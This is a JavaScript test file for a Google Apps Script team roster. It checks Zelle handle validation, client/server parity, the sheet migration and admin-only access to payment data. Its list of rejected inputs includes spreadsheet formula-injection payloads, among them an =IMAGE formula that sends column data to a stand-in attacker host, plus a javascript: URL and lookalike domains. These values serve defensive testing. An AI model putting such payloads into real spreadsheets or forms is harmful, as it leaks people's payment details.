"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

function createAppsScriptContext() {
  const context = vm.createContext({ console });
  vm.runInContext(
    fs.readFileSync(
      path.resolve(__dirname, "..", "google-apps-script", "Code.gs"),
      "utf8",
    ),
    context,
  );
  context.LockService = {
    getScriptLock: () => ({ waitLock() {}, releaseLock() {} }),
  };
  return context;
}

// Like Sheets: a leading apostrophe marks plain text and isn't returned.
function fromSheetInput(value) {
  return typeof value === "string" && value.startsWith("'") ? value.slice(1) : value;
}

function createRosterSheet(rows) {
  const data = rows.map((row) => row.slice());
  return {
    data,
    header: [],
    getLastRow: () => data.length + 1,
    getLastColumn() {
      return Math.max(this.header.length, ...data.map((row) => row.length));
    },
    getRange(row, column, numRows = 1, numColumns = 1) {
      return {
        getValues: () =>
          Array.from({ length: numRows }, (_, rowOffset) =>
            Array.from(
              { length: numColumns },
              (_, columnOffset) =>
                data[row - 2 + rowOffset]?.[column - 1 + columnOffset] ?? "",
            ),
          ),
        getValue: () => data[row - 2]?.[column - 1] ?? "",
        setValues(values) {
          values.forEach((valueRow, rowOffset) => {
            valueRow.forEach((value, columnOffset) => {
              data[row - 2 + rowOffset][column - 1 + columnOffset] = fromSheetInput(value);
            });
          });
        },
      };
    },
    appendRow: (values) => data.push(values.map(fromSheetInput)),
  };
}

function withRoster(rows) {
  const context = createAppsScriptContext();
  const sheet = createRosterSheet(rows);
  context.getRosterSheet_ = () => sheet;
  context.requireAdmin_ = () => {};
  context.requirePlayerWithoutHistoricalReferences_ = () => {};
  return { context, sheet };
}

{
  const { normalizeZelle_ } = createAppsScriptContext();
  const qr = "https://enroll.zellepay.com/qr-codes?data=eyJuYW1lIjoiQSJ9";

  assert.equal(normalizeZelle_(qr), qr);
  assert.equal(
    normalizeZelle_("Enroll.ZellePay.com/qr-codes?data=abc+/="),
    "https://enroll.zellepay.com/qr-codes?data=abc+/=",
  );
  assert.equal(normalizeZelle_("Pay.Me@Example.com"), "pay.me@example.com");
  assert.equal(normalizeZelle_("+1 (408) 555-0123"), "(408) 555-0123");
  assert.equal(normalizeZelle_("408.555.0123"), "(408) 555-0123");
  assert.throws(() => normalizeZelle_("https://evil.example/zellepay.com"), /Zelle/);
  assert.throws(() => normalizeZelle_("https://zellepay.com.evil.example/"), /Zelle/);
  assert.throws(() => normalizeZelle_("555-0123"), /Zelle/);
  assert.throws(() => normalizeZelle_("=HYPERLINK(1)"), /Zelle/);
  [
    '=IF(MID(E3,1,1)="a","x@y.z","")',
    '=IMAGE("https://evil.example/?"&JOIN(",",E2:E99)&"@x.y")',
    "+1@x.y",
    "-cmd@x.y",
    "@user@x.y",
    "javascript:alert(1)//@x.yz",
  ].forEach((value) => {
    assert.throws(
      () => normalizeZelle_(value),
      /Zelle/,
      `formula-shaped or unsafe value must be rejected: ${value}`,
    );
  });
}

{
  // The client mirror in roster.js must accept and reject the same values.
  const source = fs.readFileSync(path.resolve(__dirname, "..", "roster.js"), "utf8");
  const start = source.indexOf("  function normalizeZelle(value) {");
  const end = source.indexOf("\n  }\n", start) + 4;
  const clientNormalize = vm.runInNewContext(`(${source.slice(start, end).trim()})`);
  const { normalizeZelle_ } = createAppsScriptContext();
  [
    "https://enroll.zellepay.com/qr-codes?data=eyJuYW1lIjoiQSJ9",
    "zellepay.com",
    "Pay.Me@Example.com",
    "+1 (408) 555-0123",
    "408.555.0123",
    "555-0123",
    "=IF(1,\"a@b.co\")",
    "+1@x.y",
    "https://zelle.com.evil.example/",
    "",
  ].forEach((value) => {
    let server = "";
    try {
      server = normalizeZelle_(value);
    } catch (error) {
      server = "";
    }
    assert.equal(clientNormalize(value), server, `client/server parity for ${value}`);
  });
}

{
  // A stray column G must be merged into Note without touching Zelle (E) or
  // BBC Membership (F).
  const { context, sheet } = withRoster([
    ["Ann", "@ann", "", "note A", "ann@bank.example", "BBC-1", "extra A"],
    ["Bob", "@bob", "", "", "", "", ""],
  ]);
  sheet.header = ["Name", "Venmo", "Facebook", "Note", "Zelle", "BBC Membership", "Extra"];
  sheet.getRange = ((getRange) =>
    function (row, column, numRows, numColumns) {
      if (row === 1) {
        return { getValues: () => [sheet.header.slice(column - 1, column - 1 + (numColumns || 1))] };
      }
      return getRange.call(this, row, column, numRows, numColumns);
    })(sheet.getRange);
  sheet.deleteColumns = (start, count) => {
    sheet.header.splice(start - 1, count);
    sheet.data.forEach((row) => row.splice(start - 1, count));
  };
  context.migrateRosterSheet_(sheet);
  assert.deepEqual(
    [...sheet.data[0]],
    ["Ann", "@ann", "", "note A; extra A", "ann@bank.example", "BBC-1"],
  );
  assert.deepEqual([...sheet.data[1]], ["Bob", "@bob", "", "", "", ""]);
}

{
  // Renames keep the stored Zelle unless a zelle param is sent.
  const { context, sheet } = withRoster([["Ann", "@ann", "", "", "ann@example.com", ""]]);
  context.renamePlayerEverywhere_ = () => ({});
  context.saveRosterMember_({ oldPlayerName: "Ann", playerName: "Anna", venmo: "@ann" });
  assert.deepEqual([...sheet.data[0]], ["Anna", "@ann", "", "", "ann@example.com", ""]);
  context.saveRosterMember_({ oldPlayerName: "Anna", playerName: "ANNA", venmo: "@ann" });
  assert.deepEqual([...sheet.data[0]], ["ANNA", "@ann", "", "", "ann@example.com", ""]);
  context.saveRosterMember_({
    oldPlayerName: "ANNA",
    playerName: "Annie",
    venmo: "@ann",
    zelle: "annie@example.com",
  });
  assert.deepEqual([...sheet.data[0]], ["Annie", "@ann", "", "", "annie@example.com", ""]);
}

{
  // listRoster through doGet: Zelle values only with a valid admin token.
  const { context } = withRoster([["Ann", "@ann", "", "", "ann@example.com"]]);
  context.ContentService = {
    MimeType: { JAVASCRIPT: "js" },
    createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
  };
  context.hasAdminToken_ = (token) => token === "good";
  const call = (params) => {
    const { text } = context.doGet({ parameter: { callback: "cb", ...params } });
    return JSON.parse(text.slice(3, -2));
  };
  const anonymous = call({ action: "listRoster" });
  assert.equal(anonymous.isAdmin, false);
  assert.equal("zelle" in anonymous.roster[0], false);
  assert.equal("hasZelle" in anonymous.roster[0], false, "non-admins can't tell a Zelle is on file");
  const expired = call({ action: "listRoster", adminToken: "stale" });
  assert.equal(expired.isAdmin, false);
  assert.equal("zelle" in expired.roster[0], false);
  assert.equal("hasZelle" in expired.roster[0], false);
  const admin = call({ action: "listRoster", adminToken: "good" });
  assert.equal(admin.isAdmin, true);
  assert.equal(admin.roster[0].zelle, "ann@example.com");
}

{
  const { context } = withRoster([
    ["Ann", "@ann", "", "", "ann@example.com"],
    ["Bob", "@bob", "", "", ""],
  ]);
  const publicRoster = context.toPublicRoster_(context.getRoster_());

  assert.deepEqual(
    publicRoster.map((member) => [member.name, "hasZelle" in member, "zelle" in member]),
    [
      ["Ann", false, false],
      ["Bob", false, false],
    ],
    "the public roster says nothing about Zelle",
  );
  assert.equal(context.getRoster_()[0].zelle, "ann@example.com");
}

{
  const { context, sheet } = withRoster([["Ann", "@ann", "", "", "ann@example.com"]]);

  context.saveRosterMember_({ playerName: "Ann", venmo: "@ann2" });
  assert.equal(
    sheet.data[0][4],
    "ann@example.com",
    "a save without a zelle param (older cached page) keeps the stored Zelle",
  );

  context.saveRosterMember_({ playerName: "Ann", venmo: "@ann", zelle: "4085550123" });
  assert.equal(sheet.data[0][4], "(408) 555-0123");

  context.saveRosterMember_({ playerName: "Ann", venmo: "@ann", zelle: "" });
  assert.equal(sheet.data[0][4], "", "an admin can clear a Zelle");

  context.saveRosterMember_({ playerName: "Cat", venmo: "@cat", zelle: "cat@example.com" });
  assert.deepEqual([...sheet.data[1]], ["Cat", "@cat", "", "", "cat@example.com", ""]);
}

{
  const { context, sheet } = withRoster([
    ["Ann", "@ann", "", "", ""],
    ["Bob", "@bob", "", "", "bob@example.com"],
  ]);

  context.hasAdminToken_ = (token) => token === "good";

  // Anonymous visitors can't add or change a Zelle: the param is ignored.
  assert.throws(
    () =>
      context.completeRosterMemberInfo_({
        playerName: "Ann",
        zelle: "ann@example.com",
      }),
    /no missing member info/,
  );
  assert.equal(sheet.data[0][4], "");
  assert.throws(
    () =>
      context.completeRosterMemberInfo_({
        playerName: "Bob",
        zelle: "someone-else@example.com",
        adminToken: "stale",
      }),
    /no missing member info/,
  );
  assert.equal(sheet.data[1][4], "bob@example.com");
  const withNote = context.completeRosterMemberInfo_({
    playerName: "Ann",
    zelle: "ann@example.com",
    note: "hi",
  });
  assert.deepEqual(Array.from(withNote.updatedFields), ["Note"]);
  assert.equal(sheet.data[0][4], "");

  // An admin token still allows filling an empty Zelle here.
  const result = context.completeRosterMemberInfo_({
    playerName: "Ann",
    zelle: "ann@example.com",
    note: "hi",
    adminToken: "good",
  });
  assert.deepEqual(Array.from(result.updatedFields), ["Zelle"]);
  assert.equal(sheet.data[0][4], "ann@example.com");
}

console.log("roster-zelle tests passed");
